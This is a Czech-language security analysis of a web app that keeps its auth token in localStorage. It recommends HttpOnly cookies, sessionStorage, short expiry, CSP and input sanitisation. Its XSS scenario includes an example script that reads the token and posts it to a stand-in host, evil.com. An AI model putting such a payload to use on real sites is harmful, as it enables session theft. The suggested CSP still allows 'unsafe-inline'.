# 🔐 BEZPEČNOSTNÍ ANALÝZA: Token v localStorage

## 📋 SOUČASNÝ STAV

**Datum analýzy:** 17. listopadu 2025  
**Severity:** 🔴 HIGH RISK

### Co dělá současná implementace

```javascript
// src/utils/authStorage.js
localStorage.setItem('auth_token_persistent', token);
```

**Token je uložen v localStorage:**
- ✅ Přežije refresh stránky
- ✅ Přežije zavření prohlížeče
- ❌ Je viditelný v DevTools → Application → Local Storage
- ❌ Je přístupný všemu JavaScriptu na stránce
- ❌ Je zranitelný proti XSS útokům

---

## ⚠️ BEZPEČNOSTNÍ RIZIKA

### 1. **XSS (Cross-Site Scripting) - KRITICKÉ RIZIKO**

**Scénář útoku:**
```javascript
// Útočník vloží škodlivý kód (např. přes nezabezpečený input)
<script>
  // Ukradne token z localStorage
  const token = localStorage.getItem('auth_token_persistent');
  
  // Pošle na útočníkův server
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify({ token, site: 'eeo.zachranka.cz' })
  });
</script>
```

**Důsledky:**
- 🔴 Útočník získá přístup k účtu uživatele
- 🔴 Může zobrazit/upravit všechny objednávky
- 🔴 Může získat osobní data pacientů/dodavatelů
- 🔴 Token platí 7 dní (podle kódu: `TOKEN_EXPIRY_HOURS = 24 * 7`)

### 2. **Browser Extensions**

```javascript
// Škodlivý browser extension může číst localStorage
chrome.storage.local.get(['auth_token_persistent'], function(result) {
  // Útočník má token
  sendToServer(result);
});
```

### 3. **Physical Access**

```javascript
// Kdokoliv s přístupem k počítači:
1. Otevře DevTools (F12)
2. Application → Local Storage
3. Zkopíruje auth_token_persistent
4. Může se přihlásit ze svého počítače
```

### 4. **"Šifrování" je PLACEBO**

```javascript
// Současný kód "šifruje" token
const encrypted = await encryptData(dataString);
localStorage.setItem('auth_token_persistent', encrypted);
```

**Problém:**
- ❌ Šifrovací klíč je **uložen v JavaScriptu** (viditelný v source code)
- ❌ Útočník, který má XSS, má i přístup k dešifrovací funkci
- ❌ "Šifrování" bez bezpečného klíče = **Security Theater**

```javascript
// Útočník prostě použije vaši vlastní funkci:
import { decryptData } from './encryption.js';
const encrypted = localStorage.getItem('auth_token_persistent');
const token = await decryptData(encrypted);
// Má token!
```

---

## 🎯 REÁLNÁ RIZIKA PRO VÁŠ SYSTÉM

### Citlivá data v systému EEO:
- 📋 Objednávky s částkami (finanční data)
- 👤 Osobní údaje zaměstnanců
- 🏥 Možné informace o pacientech
- 💰 Informace o dodavatelích
- 🔑 Přístup k pokladní knize

### GDPR & Compliance:
- ❌ Nedostatečná ochrana osobních údajů
- ❌ Token = prostředek k získání GDPR dat
- ❌ Audit může označit za "nedostatečné zabezpečení"

---

## ✅ SPRÁVNÁ ŘEŠENÍ

### **Řešení 1: HttpOnly Cookies (DOPORUČENO)**

**Backend nastaví cookie:**
```php
// PHP Backend při /auth/login
setcookie(
    'auth_token',
    $token,
    [
        'expires' => time() + (7 * 24 * 3600),  // 7 dní
        'path' => '/',
        'domain' => '.zachranka.cz',
        'secure' => true,      // Pouze HTTPS
        'httponly' => true,    // ✅ JavaScript nemá přístup
        'samesite' => 'Strict' // ✅ Ochrana proti CSRF
    ]
);
```

**Frontend NEMUSÍ token ukládat:**
```javascript
// Token je automaticky v každém requestu
fetch('https://api.eeo/orders', {
  credentials: 'include'  // Browser přidá cookie automaticky
});
```

**Výhody:**
- ✅ JavaScript NEMŮŽE přečíst token (httponly)
- ✅ XSS útok NEMŮŽE ukrást token
- ✅ Browser posílá automaticky
- ✅ CSRF ochrana přes SameSite

**Nevýhody:**
- ⚠️ Vyžaduje změny na backendu
- ⚠️ CORS konfigurace musí být správná

---

### **Řešení 2: In-Memory Storage (Středně bezpečné)**

**Token pouze v RAM:**
```javascript
// AuthContext.js
const [token, setToken] = useState(null);  // Pouze v paměti

// Po zavření prohlížeče = token ztracen
// Po refresh stránky = nutno přihlásit znovu
```

**Výhody:**
- ✅ Token není v localStorage
- ✅ XSS útok má kratší window (pouze dokud je stránka otevřená)
- ✅ Po zavření prohlížeče = automaticky odhlášen

**Nevýhody:**
- ❌ Refresh stránky = odhlášení
- ❌ Nová záložka = odhlášení
- ❌ Špatná UX

---

### **Řešení 3: SessionStorage (Mírně lepší než localStorage)**

**Token v sessionStorage:**
```javascript
sessionStorage.setItem('auth_token', token);
```

**Výhody:**
- ✅ Po zavření záložky = token smazán
- ✅ Sdílení mezi záložkami = NE

**Nevýhody:**
- ❌ Stále čitelné JavaScriptem
- ❌ Stále zranitelné vůči XSS
- ⚠️ Jenom trochu lepší než localStorage

---

### **Řešení 4: Token Rotation + Short Expiry**

**Kombinace opatření:**
```javascript
1. Token v sessionStorage (ne localStorage)
2. Krátká platnost (15 minut)
3. Automatický refresh (refresh token)
4. Invalidace po detekci podezřelé aktivity
```

**Výhody:**
- ✅ Omezené časové okno pro útok
- ✅ Refresh token může být v HttpOnly cookie
- ✅ Lepší než současný stav

---

## 🔒 DOPORUČENÁ IMPLEMENTACE

### **Fáze 1: Quick Fix (Ihned)**

```javascript
// 1. Změnit localStorage → sessionStorage
// src/utils/authStorage.js

- localStorage.setItem('auth_token_persistent', token);
+ sessionStorage.setItem('auth_token', token);
```

**Benefit:**
- Token zmizí po zavření prohlížeče
- Útočník má kratší časové okno

---

### **Fáze 2: Střední řešení (1-2 týdny)**

```javascript
// 1. Token pouze v paměti (React state)
// 2. Session timeout po 30 minutách neaktivity
// 3. Varování před odhlášením

const [token, setToken] = useState(null);
const [tokenExpiry, setTokenExpiry] = useState(null);

// Kontrola expirace každou minutu
useEffect(() => {
  const interval = setInterval(() => {
    if (tokenExpiry && Date.now() > tokenExpiry) {
      // Varování 5 minut před odhlášením
      if (Date.now() > tokenExpiry - 5*60*1000) {
        showWarning('Za 5 minut budete odhlášeni');
      }
    }
  }, 60000);
  return () => clearInterval(interval);
}, [tokenExpiry]);
```

---

### **Fáze 3: Ideální řešení (1-2 měsíce)**

**Backend změny:**
```php
// 1. HttpOnly cookie pro access token (krátká platnost - 15 min)
// 2. HttpOnly cookie pro refresh token (dlouhá platnost - 7 dní)
// 3. Endpoint /auth/refresh pro obnovení

// /auth/login
setcookie('access_token', $accessToken, [
    'expires' => time() + 900,  // 15 minut
    'httponly' => true,
    'secure' => true,
    'samesite' => 'Strict'
]);

setcookie('refresh_token', $refreshToken, [
    'expires' => time() + (7 * 24 * 3600),  // 7 dní
    'httponly' => true,
    'secure' => true,
    'samesite' => 'Strict'
]);
```

**Frontend změny:**
```javascript
// Automatický refresh před expirací
useEffect(() => {
  const interval = setInterval(async () => {
    // Backend automaticky použije refresh_token z cookie
    await fetch('/api.eeo/auth/refresh', {
      credentials: 'include'
    });
    // Nový access_token je v cookie
  }, 12 * 60 * 1000);  // každých 12 minut
  
  return () => clearInterval(interval);
}, []);
```

---

## 📊 SROVNÁNÍ ŘEŠENÍ

| Řešení | Bezpečnost | UX | Složitost | Čas impl. |
|--------|------------|----|-----------|-----------| 
| **Současný stav** | 🔴 2/10 | ✅ 10/10 | - | - |
| **SessionStorage** | 🟡 4/10 | ✅ 9/10 | ⚡ Nízká | 1 den |
| **In-Memory** | 🟡 5/10 | ❌ 4/10 | ⚡ Nízká | 2 dny |
| **HttpOnly Cookies** | ✅ 9/10 | ✅ 10/10 | 🔥 Střední | 2 týdny |
| **Full OAuth2 Flow** | ✅ 10/10 | ✅ 9/10 | 🔥🔥 Vysoká | 2 měsíce |

---

## 🚨 OKAMŽITÁ DOPORUČENÍ

### **1. NEJRYCHLEJŠÍ FIX (dnes)**

```javascript
// Změnit všude localStorage → sessionStorage
// + zkrátit platnost tokenu z 7 dní na 24 hodin
```

### **2. XSS OCHRANA (tato chvíle)**

```javascript
// Content Security Policy v index.html
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; 
               script-src 'self' 'unsafe-inline';
               connect-src 'self' https://api.eeo;">
```

### **3. INPUT SANITIZACE**

```javascript
// Všechny user inputy sanitizovat
import DOMPurify from 'dompurify';

const clean = DOMPurify.sanitize(userInput);
```

---

## 📝 ZÁVĚR

### Současný stav:
- 🔴 **VYSOKÉ RIZIKO** - Token v localStorage je zranitelný
- 🔴 "Šifrování" nepomáhá (klíč je v JS kódu)
- 🔴 Platnost 7 dní = velké časové okno pro útok

### Minimální opatření (ASAP):
1. ✅ Změnit localStorage → sessionStorage
2. ✅ Zkrátit platnost z 7 dní na 8 hodin
3. ✅ Přidat CSP header
4. ✅ Sanitizovat všechny inputy

### Ideální řešení (plánovat):
1. 🎯 HttpOnly cookies pro tokeny
2. 🎯 Krátká platnost + automatický refresh
3. 🎯 Monitoring podezřelé aktivity
4. 🎯 2FA pro citlivé operace

---

## 📞 DALŠÍ KROKY

1. **Diskuze s týmem** - Která varianta je reálná?
2. **Prioritizace** - Co implementovat nejdřív?
3. **Backend požadavky** - Potřebujeme HttpOnly cookies?
4. **Testing** - Security audit po implementaci

---

## 📚 ZDROJE

- [OWASP: Token Storage](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#local-storage)
- [Auth0: Token Best Practices](https://auth0.com/docs/secure/tokens/token-best-practices)
- [MDN: HttpOnly Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#restrict_access_to_cookies)

